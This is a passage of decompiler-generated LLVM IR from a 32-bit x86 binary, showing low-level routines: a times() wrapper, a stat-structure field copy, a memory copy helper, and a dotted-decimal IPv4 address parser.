dec_label_pc_80523b5:                             ; preds = %dec_label_pc_8052390, %dec_label_pc_805239d.dec_label_pc_80523b5_crit_edge, %dec_label_pc_80523b2
  %v0_80523b5 = phi i32 [ %v0_80523b5.pre, %dec_label_pc_805239d.dec_label_pc_80523b5_crit_edge ], [ -1, %dec_label_pc_80523b2 ], [ %v0_80523a0, %dec_label_pc_8052390 ]
  %v2_80523b7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80523b7, i32* @edx, align 4
  store i32 %v0_805236e, i32* @ebx, align 4
  ret i32 %v0_80523b5

; uselistorder directives
  uselistorder i32 %v0_80523a0, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_805254b, { 1, 0 }
  uselistorder label %dec_label_pc_80523b5, { 2, 1, 0 }
}

define i32 @function_80523bb(%tms* %arg1) local_unnamed_addr {
dec_label_pc_80523bb:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80523bb = load i32, i32* @edi, align 4
  store i32 %v0_80523bb, i32* %stack_var_-4, align 4
  %v4_80523bf = ptrtoint %tms* %arg1 to i32
  store i32 %v4_80523bf, i32* %edi.global-to-local, align 4
  %v0_80523c3 = load i32, i32* @ebx, align 4
  %v3_80523cb = call i32 @times(%tms* %arg1)
  store i32 %v3_80523cb, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_80523cb, -4095
  br i1 %tmp9, label %dec_label_pc_80523e3, label %dec_label_pc_80523d7

dec_label_pc_80523d7:                             ; preds = %dec_label_pc_80523bb
  %v1_80523d7 = call i32 @function_805021b(i32 %v0_80523c3)
  %v0_80523dc = load i32, i32* %edi.global-to-local, align 4
  %v1_80523dc = sub i32 0, %v0_80523dc
  %v2_80523de = inttoptr i32 %v1_80523d7 to i32*
  store i32 %v1_80523dc, i32* %v2_80523de, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80523e7.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80523e3

dec_label_pc_80523e3:                             ; preds = %dec_label_pc_80523bb, %dec_label_pc_80523d7
  %v2_80523e7 = phi i32 [ %v0_80523bb, %dec_label_pc_80523bb ], [ %v2_80523e7.pre, %dec_label_pc_80523d7 ]
  %v0_80523e3 = phi i32 [ %v3_80523cb, %dec_label_pc_80523bb ], [ -1, %dec_label_pc_80523d7 ]
  store i32 %v2_80523e7, i32* %edi.global-to-local, align 4
  ret i32 %v0_80523e3

; uselistorder directives
  uselistorder i32 %v3_80523cb, { 1, 0, 2 }
  uselistorder i32* @edi, { 10, 11, 12, 13, 14, 15, 140, 2, 141, 142, 149, 36, 46, 47, 48, 49, 50, 37, 38, 39, 40, 41, 42, 43, 44, 45, 3, 4, 5, 6, 7, 8, 9, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27, 28, 29, 30, 147, 148, 31, 32, 33, 34, 35, 51, 52, 53, 54, 55, 56, 104, 57, 58, 59, 105, 106, 143, 144, 145, 146, 97, 98, 99, 139, 108, 109, 110, 111, 112, 113, 114, 115, 63, 64, 65, 83, 84, 85, 67, 68, 69, 70, 71, 91, 92, 93, 94, 95, 96, 80, 81, 82, 86, 87, 88, 89, 90, 116, 117, 100, 118, 107, 119, 120, 121, 60, 61, 62, 101, 72, 66, 73, 74, 75, 76, 77, 78, 79, 102, 103, 122, 123, 124, 125, 126, 127, 1, 128, 129, 130, 131, 132, 133, 134, 135, 136, 138, 137 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80523e3, { 1, 0 }
}

define i32 @function_80523e9(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80523e9:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80523ea = load i32, i32* @ebx, align 4
  store i32 %v0_80523ea, i32* %stack_var_-8, align 4
  %v4_80523ee = ptrtoint i16* %arg1 to i32
  store i32 %v4_80523ee, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_80523fb = inttoptr i32 %arg2 to i8*
  %v4_80523fb = call i32 @function_805026c(i8* %v3_80523fb, i32 0, i32 88)
  store i32 %v4_80523fb, i32* %eax.global-to-local, align 4
  %v2_8052400 = load i16, i16* %arg1, align 2
  %v3_8052400 = zext i16 %v2_8052400 to i32
  store i32 %v3_8052400, i32* %eax.global-to-local, align 4
  %v0_8052403 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052403 = add i32 %v0_8052403, 4
  %v2_8052403 = inttoptr i32 %v1_8052403 to i32*
  store i32 0, i32* %v2_8052403, align 4
  %v0_805240a = load i32, i32* %eax.global-to-local, align 4
  %v1_805240a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805240a = inttoptr i32 %v1_805240a to i32*
  store i32 %v0_805240a, i32* %v2_805240a, align 4
  %v0_805240c = load i32, i32* %esi.global-to-local, align 4
  %v1_805240c = add i32 %v0_805240c, 4
  %v2_805240c = inttoptr i32 %v1_805240c to i32*
  %v3_805240c = load i32, i32* %v2_805240c, align 4
  store i32 %v3_805240c, i32* %eax.global-to-local, align 4
  %v1_805240f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805240f = add i32 %v1_805240f, 12
  %v3_805240f = inttoptr i32 %v2_805240f to i32*
  store i32 %v3_805240c, i32* %v3_805240f, align 4
  %v0_8052412 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052412 = add i32 %v0_8052412, 8
  %v2_8052412 = inttoptr i32 %v1_8052412 to i16*
  %v3_8052412 = load i16, i16* %v2_8052412, align 2
  %v4_8052412 = zext i16 %v3_8052412 to i32
  store i32 %v4_8052412, i32* %eax.global-to-local, align 4
  %v1_8052416 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052416 = add i32 %v1_8052416, 16
  %v3_8052416 = inttoptr i32 %v2_8052416 to i32*
  store i32 %v4_8052412, i32* %v3_8052416, align 4
  %v0_8052419 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052419 = add i32 %v0_8052419, 10
  %v2_8052419 = inttoptr i32 %v1_8052419 to i16*
  %v3_8052419 = load i16, i16* %v2_8052419, align 2
  %v4_8052419 = zext i16 %v3_8052419 to i32
  store i32 %v4_8052419, i32* %eax.global-to-local, align 4
  %v1_805241d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805241d = add i32 %v1_805241d, 20
  %v3_805241d = inttoptr i32 %v2_805241d to i32*
  store i32 %v4_8052419, i32* %v3_805241d, align 4
  %v0_8052420 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052420 = add i32 %v0_8052420, 12
  %v2_8052420 = inttoptr i32 %v1_8052420 to i16*
  %v3_8052420 = load i16, i16* %v2_8052420, align 2
  %v4_8052420 = zext i16 %v3_8052420 to i32
  store i32 %v4_8052420, i32* %eax.global-to-local, align 4
  %v1_8052424 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052424 = add i32 %v1_8052424, 24
  %v3_8052424 = inttoptr i32 %v2_8052424 to i32*
  store i32 %v4_8052420, i32* %v3_8052424, align 4
  %v0_8052427 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052427 = add i32 %v0_8052427, 14
  %v2_8052427 = inttoptr i32 %v1_8052427 to i16*
  %v3_8052427 = load i16, i16* %v2_8052427, align 2
  %v4_8052427 = zext i16 %v3_8052427 to i32
  store i32 %v4_8052427, i32* %eax.global-to-local, align 4
  %v1_805242b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805242b = add i32 %v1_805242b, 28
  %v3_805242b = inttoptr i32 %v2_805242b to i32*
  store i32 %v4_8052427, i32* %v3_805242b, align 4
  %v0_805242e = load i32, i32* %esi.global-to-local, align 4
  %v1_805242e = add i32 %v0_805242e, 16
  %v2_805242e = inttoptr i32 %v1_805242e to i16*
  %v3_805242e = load i16, i16* %v2_805242e, align 2
  %v4_805242e = zext i16 %v3_805242e to i32
  store i32 %v4_805242e, i32* %eax.global-to-local, align 4
  %v0_8052432 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052432 = add i32 %v0_8052432, 36
  %v2_8052432 = inttoptr i32 %v1_8052432 to i32*
  store i32 0, i32* %v2_8052432, align 4
  %v0_8052439 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052439 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052439 = add i32 %v1_8052439, 32
  %v3_8052439 = inttoptr i32 %v2_8052439 to i32*
  store i32 %v0_8052439, i32* %v3_8052439, align 4
  %v0_805243c = load i32, i32* %esi.global-to-local, align 4
  %v1_805243c = add i32 %v0_805243c, 20
  %v2_805243c = inttoptr i32 %v1_805243c to i32*
  %v3_805243c = load i32, i32* %v2_805243c, align 4
  store i32 %v3_805243c, i32* %eax.global-to-local, align 4
  %v1_805243f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805243f = add i32 %v1_805243f, 44
  %v3_805243f = inttoptr i32 %v2_805243f to i32*
  store i32 %v3_805243c, i32* %v3_805243f, align 4
  %v0_8052442 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052442 = add i32 %v0_8052442, 24
  %v2_8052442 = inttoptr i32 %v1_8052442 to i32*
  %v3_8052442 = load i32, i32* %v2_8052442, align 4
  store i32 %v3_8052442, i32* %eax.global-to-local, align 4
  %v1_8052445 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052445 = add i32 %v1_8052445, 48
  %v3_8052445 = inttoptr i32 %v2_8052445 to i32*
  store i32 %v3_8052442, i32* %v3_8052445, align 4
  %v0_8052448 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052448 = add i32 %v0_8052448, 28
  %v2_8052448 = inttoptr i32 %v1_8052448 to i32*
  %v3_8052448 = load i32, i32* %v2_8052448, align 4
  store i32 %v3_8052448, i32* %eax.global-to-local, align 4
  %v1_805244b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805244b = add i32 %v1_805244b, 52
  %v3_805244b = inttoptr i32 %v2_805244b to i32*
  store i32 %v3_8052448, i32* %v3_805244b, align 4
  %v0_805244e = load i32, i32* %esi.global-to-local, align 4
  %v1_805244e = add i32 %v0_805244e, 32
  %v2_805244e = inttoptr i32 %v1_805244e to i32*
  %v3_805244e = load i32, i32* %v2_805244e, align 4
  store i32 %v3_805244e, i32* %eax.global-to-local, align 4
  %v1_8052451 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052451 = add i32 %v1_8052451, 56
  %v3_8052451 = inttoptr i32 %v2_8052451 to i32*
  store i32 %v3_805244e, i32* %v3_8052451, align 4
  %v0_8052454 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052454 = add i32 %v0_8052454, 40
  %v2_8052454 = inttoptr i32 %v1_8052454 to i32*
  %v3_8052454 = load i32, i32* %v2_8052454, align 4
  store i32 %v3_8052454, i32* %eax.global-to-local, align 4
  %v1_8052457 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052457 = add i32 %v1_8052457, 64
  %v3_8052457 = inttoptr i32 %v2_8052457 to i32*
  store i32 %v3_8052454, i32* %v3_8052457, align 4
  %v0_805245a = load i32, i32* %esi.global-to-local, align 4
  %v1_805245a = add i32 %v0_805245a, 48
  %v2_805245a = inttoptr i32 %v1_805245a to i32*
  %v3_805245a = load i32, i32* %v2_805245a, align 4
  store i32 %v3_805245a, i32* %eax.global-to-local, align 4
  %v1_805245d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805245d = add i32 %v1_805245d, 72
  %v3_805245d = inttoptr i32 %v2_805245d to i32*
  store i32 %v3_805245a, i32* %v3_805245d, align 4
  %v2_8052463 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052463, i32* @ebx, align 4
  ret i32 %v3_805245a

; uselistorder directives
  uselistorder i32 72, { 1, 0, 2 }
  uselistorder i32 64, { 2, 1, 0 }
  uselistorder i32 40, { 5, 4, 1, 3, 2, 0, 6 }
  uselistorder i32 56, { 2, 1, 0 }
  uselistorder i32 52, { 1, 0, 2, 3 }
  uselistorder i32 48, { 4, 5, 3, 1, 2, 0 }
  uselistorder i32 32, { 22, 23, 29, 15, 19, 20, 21, 24, 1, 0, 2, 3, 18, 4, 5, 6, 7, 8, 26, 25, 10, 9, 12, 11, 13, 14, 17, 16, 27, 28 }
  uselistorder i32 36, { 4, 3, 0, 2, 1 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 24, { 17, 18, 13, 14, 15, 19, 16, 20, 21, 1, 2, 10, 34, 39, 7, 5, 11, 24, 31, 0, 3, 32, 8, 4, 29, 40, 35, 9, 22, 23, 36, 12, 25, 6, 26, 27, 28, 30, 33, 37, 38, 41, 42, 43, 44, 46, 47, 45 }
  uselistorder i32 20, { 14, 15, 3, 10, 11, 12, 16, 13, 17, 18, 19, 1, 2, 9, 6, 4, 20, 0, 7, 8, 5, 21, 22, 23 }
  uselistorder i32 16, { 38, 39, 31, 32, 33, 34, 35, 36, 14, 27, 54, 3, 28, 29, 30, 0, 4, 40, 41, 6, 5, 42, 1, 7, 37, 43, 15, 17, 26, 11, 12, 23, 44, 8, 48, 20, 18, 45, 24, 46, 9, 21, 10, 22, 13, 19, 47, 49, 25, 50, 2, 51, 53, 16, 52 }
  uselistorder i32 8, { 39, 28, 29, 30, 31, 32, 33, 34, 35, 10, 105, 11, 106, 12, 18, 81, 82, 83, 84, 85, 86, 87, 3, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 4, 20, 21, 22, 23, 24, 25, 26, 27, 40, 41, 42, 43, 44, 45, 14, 5, 15, 6, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 13, 63, 64, 7, 65, 66, 67, 68, 8, 69, 36, 37, 38, 70, 104, 92, 93, 94, 16, 98, 88, 1, 2, 95, 17, 89, 90, 91, 96, 97, 19, 99, 100, 101, 102, 9, 103, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_805026c, { 1, 4, 3, 2, 0 }
}

define i32 @function_8052466(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052466:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052467 = load i32, i32* @esi, align 4
  store i32 %v0_8052467, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8052468 = sdiv i32 %sext, 16777216
  store i32 %v4_8052468, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052472 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052472, i32* %edi.global-to-local, align 4
  %v2_8052476 = udiv i32 %v4_8052468, 4
  %v3_8052479 = inttoptr i32 %arg2 to i8*
  %v4_8052479 = bitcast i16* %arg1 to i8*
  %v5_8052479 = call i8* @_memcpy(i8* %v4_8052479, i8* %v3_8052479, i32 %v2_8052476)
  %v0_805247b = load i32, i32* %eax.global-to-local, align 4
  %v2_805247b = and i32 %v0_805247b, 2
  %v3_805247b = icmp eq i32 %v2_805247b, 0
  br i1 %v3_805247b, label %dec_label_pc_8052481, label %dec_label_pc_805247f

dec_label_pc_805247f:                             ; preds = %dec_label_pc_8052466
  %v0_805247f = load i32, i32* %esi.global-to-local, align 4
  %v1_805247f = inttoptr i32 %v0_805247f to i16*
  %v2_805247f = load i16, i16* %v1_805247f, align 2
  %v3_805247f = load i32, i32* %edi.global-to-local, align 4
  %v4_805247f = inttoptr i32 %v3_805247f to i16*
  store i16 %v2_805247f, i16* %v4_805247f, align 2
  %v5_805247f = load i32, i32* %edi.global-to-local, align 4
  %v6_805247f = load i32, i32* %esi.global-to-local, align 4
  %v7_805247f = load i1, i1* @df, align 1
  %v8_805247f = select i1 %v7_805247f, i32 -2, i32 2
  %v9_805247f = add i32 %v8_805247f, %v5_805247f
  %v10_805247f = add i32 %v8_805247f, %v6_805247f
  store i32 %v9_805247f, i32* %edi.global-to-local, align 4
  store i32 %v10_805247f, i32* %esi.global-to-local, align 4
  %v0_8052481.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052481

dec_label_pc_8052481:                             ; preds = %dec_label_pc_8052466, %dec_label_pc_805247f
  %v0_8052481 = phi i32 [ %v0_805247b, %dec_label_pc_8052466 ], [ %v0_8052481.pre, %dec_label_pc_805247f ]
  %v2_8052481 = urem i32 %v0_8052481, 2
  %v3_8052481 = icmp eq i32 %v2_8052481, 0
  br i1 %v3_8052481, label %dec_label_pc_8052486, label %dec_label_pc_8052485

dec_label_pc_8052485:                             ; preds = %dec_label_pc_8052481
  %v0_8052485 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052485 = inttoptr i32 %v0_8052485 to i8*
  %v2_8052485 = load i8, i8* %v1_8052485, align 1
  %v3_8052485 = load i32, i32* %edi.global-to-local, align 4
  %v4_8052485 = inttoptr i32 %v3_8052485 to i8*
  store i8 %v2_8052485, i8* %v4_8052485, align 1
  %v5_8052485 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052485 = load i32, i32* %esi.global-to-local, align 4
  %v7_8052485 = load i1, i1* @df, align 1
  %v8_8052485 = select i1 %v7_8052485, i32 -1, i32 1
  %v9_8052485 = add i32 %v8_8052485, %v5_8052485
  %v10_8052485 = add i32 %v8_8052485, %v6_8052485
  store i32 %v9_8052485, i32* %edi.global-to-local, align 4
  store i32 %v10_8052485, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052486

dec_label_pc_8052486:                             ; preds = %dec_label_pc_8052481, %dec_label_pc_8052485
  store i32 %v4_8052472, i32* %eax.global-to-local, align 4
  %v2_805248a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805248a, i32* @esi, align 4
  ret i32 %v4_8052472

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 12, 11, 9, 10, 4, 2, 0, 5, 1, 6, 3, 7, 8 }
  uselistorder i1* @df, { 3, 4, 1, 0, 2 }
  uselistorder i32 4, { 3, 40, 41, 32, 33, 34, 35, 150, 151, 154, 155, 0, 159, 160, 161, 152, 10, 18, 156, 158, 71, 80, 81, 82, 83, 84, 4, 72, 73, 74, 75, 76, 77, 78, 79, 69, 70, 21, 12, 22, 23, 24, 25, 26, 27, 28, 5, 30, 29, 42, 6, 43, 11, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 8, 64, 65, 67, 66, 7, 157, 153, 31, 15, 36, 37, 38, 39, 68, 116, 117, 16, 91, 92, 123, 124, 17, 93, 94, 95, 96, 126, 127, 128, 129, 130, 131, 88, 89, 90, 109, 110, 111, 97, 98, 99, 118, 119, 120, 1, 121, 122, 106, 107, 108, 112, 113, 2, 114, 115, 132, 133, 85, 86, 87, 100, 101, 102, 103, 104, 105, 125, 19, 134, 135, 136, 137, 138, 141, 142, 143, 139, 140, 13, 149, 9, 144, 14, 145, 146, 147, 148, 162, 20 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 7, 6, 8, 9 }
  uselistorder i32* @esi, { 112, 113, 13, 14, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 3, 39, 40, 114, 115, 12, 116, 117, 118, 122, 125, 126, 127, 119, 120, 121, 62, 71, 4, 72, 73, 66, 67, 68, 69, 70, 63, 64, 65, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 46, 47, 48, 49, 50, 51, 52, 0, 53, 54, 55, 56, 5, 57, 11, 58, 59, 60, 61, 28, 100, 101, 41, 6, 42, 43, 44, 45, 74, 123, 124, 102, 103, 75, 78, 8, 92, 93, 77, 84, 10, 79, 80, 9, 88, 89, 90, 91, 83, 85, 86, 87, 7, 94, 76, 1, 95, 81, 82, 2, 96, 97, 98, 99, 104, 105, 106, 107, 108, 109, 110, 111, 128 }
  uselistorder label %dec_label_pc_8052486, { 1, 0 }
  uselistorder label %dec_label_pc_8052481, { 1, 0 }
}

define i32 @function_805248d(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805248d:
  %v1_8052498 = icmp eq i8* %arg1, null
  br i1 %v1_8052498, label %dec_label_pc_8052519, label %dec_label_pc_805249c

dec_label_pc_805249c:                             ; preds = %dec_label_pc_805248d
  %v4_8052494 = ptrtoint i8* %arg1 to i32
  %v0_80524aa.pre = load i32, i32* bitcast (i32** @global_var_8053088.71 to i32*), align 8
  br label %dec_label_pc_80524a7

dec_label_pc_80524a7:                             ; preds = %dec_label_pc_805249c, %dec_label_pc_80524f0
  %v0_80524f0 = phi i32 [ 0, %dec_label_pc_805249c ], [ %v2_80524f6, %dec_label_pc_80524f0 ]
  %v2_80524f3 = phi i32 [ 1, %dec_label_pc_805249c ], [ %v3_80524f3, %dec_label_pc_80524f0 ]
  %v0_80524a7 = phi i32 [ %v4_8052494, %dec_label_pc_805249c ], [ %v0_80524a73, %dec_label_pc_80524f0 ]
  %v1_80524a7 = inttoptr i32 %v0_80524a7 to i8*
  %v2_80524a7 = load i8, i8* %v1_80524a7, align 1
  %v3_80524a7 = sext i8 %v2_80524a7 to i32
  %v2_80524b0 = mul nsw i32 %v3_80524a7, 2
  %v3_80524b0 = add i32 %v2_80524b0, %v0_80524aa.pre
  %v4_80524b0 = inttoptr i32 %v3_80524b0 to i8*
  %v5_80524b0 = load i8, i8* %v4_80524b0, align 1
  %v6_80524b0 = and i8 %v5_80524b0, 8
  %v7_80524b0 = icmp eq i8 %v6_80524b0, 0
  br i1 %v7_80524b0, label %dec_label_pc_8052519, label %dec_label_pc_80524b7

dec_label_pc_80524b7:                             ; preds = %dec_label_pc_80524a7
  %v4_80524cb.pre = load i32, i32* @edx, align 4
  %v2_80524cb34 = load i8, i8* %v1_80524a7, align 1
  %v3_80524cb35 = zext i8 %v2_80524cb34 to i32
  %v5_80524cb36 = and i32 %v4_80524cb.pre, -256
  %v6_80524cb37 = or i32 %v3_80524cb35, %v5_80524cb36
  store i32 %v6_80524cb37, i32* @edx, align 4
  %v2_80524cd38 = sext i8 %v2_80524cb34 to i32
  %v2_80524d039 = mul nsw i32 %v2_80524cd38, 2
  %v3_80524d040 = add i32 %v2_80524d039, %v0_80524aa.pre
  %v4_80524d041 = inttoptr i32 %v3_80524d040 to i16*
  %v5_80524d042 = load i16, i16* %v4_80524d041, align 2
  %v2_80524d544 = and i16 %v5_80524d042, 8
  %v3_80524d545 = icmp eq i16 %v2_80524d544, 0
  %v1_80524d746 = icmp eq i1 %v3_80524d545, false
  br i1 %v1_80524d746, label %dec_label_pc_80524bb, label %dec_label_pc_80524d9

dec_label_pc_80524bb:                             ; preds = %dec_label_pc_80524b7, %dec_label_pc_80524ca
  %v2_80524cd50 = phi i32 [ %v2_80524cd, %dec_label_pc_80524ca ], [ %v2_80524cd38, %dec_label_pc_80524b7 ]
  %v6_80524cb49 = phi i32 [ %v6_80524cb, %dec_label_pc_80524ca ], [ %v6_80524cb37, %dec_label_pc_80524b7 ]
  %v0_80524ca48 = phi i32 [ %v1_80524ca, %dec_label_pc_80524ca ], [ %v0_80524a7, %dec_label_pc_80524b7 ]
  %v1_80524bb47 = phi i32 [ %v3_80524be, %dec_label_pc_80524ca ], [ 0, %dec_label_pc_80524b7 ]
  %v3_80524bb = mul i32 %v1_80524bb47, 10
  %v2_80524be = add i32 %v3_80524bb, -48
  %v3_80524be = add i32 %v2_80524be, %v2_80524cd50
  %v1_80524c2 = add i32 %v3_80524be, -255
  %v6_80524c2 = sub i32 254, %v3_80524be
  %v7_80524c2 = and i32 %v6_80524c2, %v3_80524be
  %v8_80524c2 = icmp slt i32 %v7_80524c2, 0
  %v9_80524c2 = icmp eq i32 %v1_80524c2, 0
  %v10_80524c2 = icmp slt i32 %v1_80524c2, 0
  %v3_80524c8 = icmp eq i1 %v10_80524c2, %v8_80524c2
  %v4_80524c8 = icmp eq i1 %v9_80524c2, false
  %v5_80524c8 = and i1 %v4_80524c8, %v3_80524c8
  br i1 %v5_80524c8, label %dec_label_pc_8052519, label %dec_label_pc_80524ca

dec_label_pc_80524ca:                             ; preds = %dec_label_pc_80524bb
  %v1_80524ca = add i32 %v0_80524ca48, 1
  %v1_80524cb = inttoptr i32 %v1_80524ca to i8*
  %v2_80524cb = load i8, i8* %v1_80524cb, align 1
  %v3_80524cb = zext i8 %v2_80524cb to i32
  %v5_80524cb = and i32 %v6_80524cb49, -256
  %v6_80524cb = or i32 %v3_80524cb, %v5_80524cb
  store i32 %v6_80524cb, i32* @edx, align 4
  %v2_80524cd = sext i8 %v2_80524cb to i32
  %v2_80524d0 = mul nsw i32 %v2_80524cd, 2
  %v3_80524d0 = add i32 %v2_80524d0, %v0_80524aa.pre
  %v4_80524d0 = inttoptr i32 %v3_80524d0 to i16*
  %v5_80524d0 = load i16, i16* %v4_80524d0, align 2
  %v2_80524d5 = and i16 %v5_80524d0, 8
  %v3_80524d5 = icmp eq i16 %v2_80524d5, 0
  %v1_80524d7 = icmp eq i1 %v3_80524d5, false
  br i1 %v1_80524d7, label %dec_label_pc_80524bb, label %dec_label_pc_80524d9

dec_label_pc_80524d9:                             ; preds = %dec_label_pc_80524ca, %dec_label_pc_80524b7
  %v1_80524bb.lcssa = phi i32 [ 0, %dec_label_pc_80524b7 ], [ %v3_80524be, %dec_label_pc_80524ca ]
  %v0_80524ca.lcssa = phi i32 [ %v0_80524a7, %dec_label_pc_80524b7 ], [ %v1_80524ca, %dec_label_pc_80524ca ]
  %v2_80524cb.lcssa = phi i8 [ %v2_80524cb34, %dec_label_pc_80524b7 ], [ %v2_80524cb, %dec_label_pc_80524ca ]
  %v6_80524d0.lcssa.in = phi i16 [ %v5_80524d042, %dec_label_pc_80524b7 ], [ %v5_80524d0, %dec_label_pc_80524ca ]
  %v8_80524d9 = sub nsw i32 2, %v2_80524f3
  %v9_80524d9 = and i32 %v8_80524d9, %v2_80524f3
  %v10_80524d9 = icmp slt i32 %v9_80524d9, 0
  %v11_80524d9 = icmp eq i32 %v2_80524f3, 3
  %v12_80524d9 = icmp slt i32 %v2_80524f3, 3
  %v3_80524dd = icmp eq i1 %v12_80524d9, %v10_80524d9
  %v4_80524dd = icmp eq i1 %v11_80524d9, false
  %v5_80524dd = and i1 %v4_80524dd, %v3_80524dd
  br i1 %v5_80524dd, label %dec_label_pc_80524e7, label %dec_label_pc_80524df

dec_label_pc_80524df:                             ; preds = %dec_label_pc_80524d9
  %v10_80524df = icmp eq i8 %v2_80524cb.lcssa, 46
  %v1_80524e2 = icmp eq i1 %v10_80524df, false
  br i1 %v1_80524e2, label %dec_label_pc_8052519, label %dec_label_pc_80524e4

dec_label_pc_80524e4:                             ; preds = %dec_label_pc_80524df
  br label %dec_label_pc_80524f0

dec_label_pc_80524e7:                             ; preds = %dec_label_pc_80524d9
  %v4_80524e8 = icmp ne i8 %v2_80524cb.lcssa, 0
  %v2_80524ec = and i16 %v6_80524d0.lcssa.in, 32
  %v3_80524ec = icmp eq i16 %v2_80524ec, 0
  %or.cond = and i1 %v4_80524e8, %v3_80524ec
  br i1 %or.cond, label %dec_label_pc_8052519, label %dec_label_pc_80524f0

dec_label_pc_80524f0:                             ; preds = %dec_label_pc_80524e7, %dec_label_pc_80524e4
  %v0_80524a73 = add i32 %v0_80524ca.lcssa, 1
  %v2_80524f0 = mul i32 %v0_80524f0, 256
  %v3_80524f3 = add nuw nsw i32 %v2_80524f3, 1
  %v2_80524f6 = or i32 %v1_80524bb.lcssa, %v2_80524f0
  %v7_80524fc = icmp sgt i32 %v2_80524f3, 3
  br i1 %v7_80524fc, label %dec_label_pc_80524fe, label %dec_label_pc_80524a7

dec_label_pc_80524fe:                             ; preds = %dec_label_pc_80524f0
  %v4_8052503 = icmp eq i32 %arg2, 0
  br i1 %v4_8052503, label %dec_label_pc_805251b, label %dec_label_pc_805250a

dec_label_pc_805250a:                             ; preds = %dec_label_pc_80524fe
  %v1_805250e = call i32 @llvm.bswap.i32(i32 %v2_80524f6)
  %v2_8052510 = inttoptr i32 %arg2 to i32*
  store i32 %v1_805250e, i32* %v2_8052510, align 4
  br label %dec_label_pc_805251b

dec_label_pc_8052519:                             ; preds = %dec_label_pc_80524e7, %dec_label_pc_80524df, %dec_label_pc_80524a7, %dec_label_pc_80524bb, %dec_label_pc_805248d
  br label %dec_label_pc_805251b

dec_label_pc_805251b:                             ; preds = %dec_label_pc_80524fe, %dec_label_pc_805250a, %dec_label_pc_8052519
  %v0_8052520 = phi i32 [ 1, %dec_label_pc_80524fe ], [ 1, %dec_label_pc_805250a ], [ 0, %dec_label_pc_8052519 ]
  ret i32 %v0_8052520

; uselistorder directives
  uselistorder i32 %v2_80524cd, { 1, 0 }
  uselistorder i32 %v6_80524cb, { 1, 0 }
  uselistorder i32 %v1_80524ca, { 0, 2, 1 }
  uselistorder i32 %v1_80524c2, { 1, 0 }
  uselistorder i32 %v3_80524be, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_80524f3, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 %v0_80524aa.pre, { 1, 0, 2 }
  uselistorder i32 256, { 1, 13, 15, 14, 2, 0, 3, 4, 5, 16, 11, 6, 7, 9, 8, 12, 10 }
  uselistorder i32 3, { 1, 2, 0, 12, 10, 13, 6, 7, 9, 3, 14, 15, 16, 17, 18, 19, 20, 11, 4, 8, 5 }
  uselistorder i32 10, { 0, 6, 5, 3, 7, 1, 12, 8, 9, 10, 11, 4, 2 }
